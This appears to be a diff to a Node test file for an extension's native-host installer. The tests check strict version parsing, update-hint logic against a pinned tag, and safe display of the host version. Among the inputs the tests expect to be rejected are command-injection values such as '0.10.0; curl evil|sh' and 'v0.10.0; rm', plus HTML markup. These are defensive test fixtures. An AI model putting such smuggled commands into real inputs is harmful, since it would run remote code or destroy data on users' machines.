@@ -4,7 +4,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 
-const { hostInstall, EXTENSION_ID_RE } = await import("../src/shell/host-install.ts");
+const { hostInstall, EXTENSION_ID_RE, parseHostVersion, hostOutdated, pinnedHostVersion, formatHostVersion } = await import("../src/shell/host-install.ts");
 const ID = "abcdefghijklmnopabcdefghijklmnop";
 const PIN = { tag: "v0.10.0", installer: { file: "install.sh", sha256: "ab".repeat(32) } };
 
@@ -51,5 +51,45 @@ test("only a 32-letter a-p id reaches the line: anything else, a quote, a semico
         const r = hostInstall({ os: "mac", arch: "arm64" }, bad, PIN);
         assert.ok(!r.ok, `refused: ${JSON.stringify(bad)}`);
         assert.ok(!EXTENSION_ID_RE.test(bad));
+    }
+});
+
+// --- the host-version hint: only a host KNOWN to be behind the pin is offered an update ---
+
+test("a reported version is parsed strictly: three whole numbers, and anything else is unknown", () => {
+    assert.deepEqual(parseHostVersion("0.10.0"), [0, 10, 0]);
+    assert.equal(formatHostVersion(parseHostVersion("12.3.456")), "12.3.456");
+    for (const bad of ["", "0.10", "0.10.0.1", "v0.10.0", "0.10.0-dev", "0.10.0 ", " 0.10.0", "1.2.x", "01.2.3x", "-1.0.0", "1e3.0.0", "99999.0.0", "0.10.0\n", "0.10.0; curl evil|sh", "<b>1.0.0</b>", null, undefined, 10, ["0.10.0"], { toString: () => "0.10.0" }]) {
+        assert.equal(parseHostVersion(bad), null, `unknown: ${JSON.stringify(bad)}`);
+    }
+});
+
+test("only a host older than the pin is outdated: equal, newer and unknown say no, and a malformed pin says no", () => {
+    const pin = { tag: "v0.10.0" };
+    const v = (s) => parseHostVersion(s);
+    assert.equal(hostOutdated(v("0.9.0"), pin), true);
+    assert.equal(hostOutdated(v("0.9.99"), pin), true);
+    assert.equal(hostOutdated(v("0.0.1"), pin), true);
+    assert.equal(hostOutdated(v("0.10.0"), pin), false, "equal");
+    assert.equal(hostOutdated(v("0.10.1"), pin), false, "newer in the patch");
+    assert.equal(hostOutdated(v("0.11.0"), pin), false, "newer in the minor");
+    assert.equal(hostOutdated(v("1.0.0"), pin), false, "newer in the major");
+    assert.equal(hostOutdated(v("0.9.0-dev"), pin), false, "unknown is never outdated");
+    assert.equal(hostOutdated(null, pin), false);
+    for (const tag of ["0.10.0", "v0.10", "v0.10.0; rm", "latest", ""]) assert.equal(hostOutdated(v("0.0.1"), { tag }), false, `a pin that is not a tag: ${tag}`);
+    assert.deepEqual(pinnedHostVersion(pin), [0, 10, 0]);
+    // Order is by number, not by text: 0.9.0 < 0.10.0 although "0.9.0" > "0.10.0" as strings.
+    assert.equal(hostOutdated(v("0.9.0"), { tag: "v0.10.0" }), true);
+    assert.equal(hostOutdated(v("0.10.0"), { tag: "v0.9.0" }), false);
+});
+
+test("Settings' status line draws the host's version only in its parsed form", async () => {
+    const { shellStatusText } = await import("../src/sidebar/settings/shell-section.tsx");
+    const ready = (version) => shellStatusText({ enabled: true, ready: true, sandboxed: true, host: { version, platform: "macos" } });
+    assert.match(ready("0.10.0"), /^Ready: window-ml-host 0\.10\.0 on macos/);
+    for (const bad of ["0.10.0-dev", "<b>x</b>", "banana"]) {
+        const text = ready(bad);
+        assert.match(text, /^Ready: window-ml-host \? on macos/, bad);
+        assert.ok(!text.includes(bad), `the raw ${bad} is not drawn`);
     }
 });
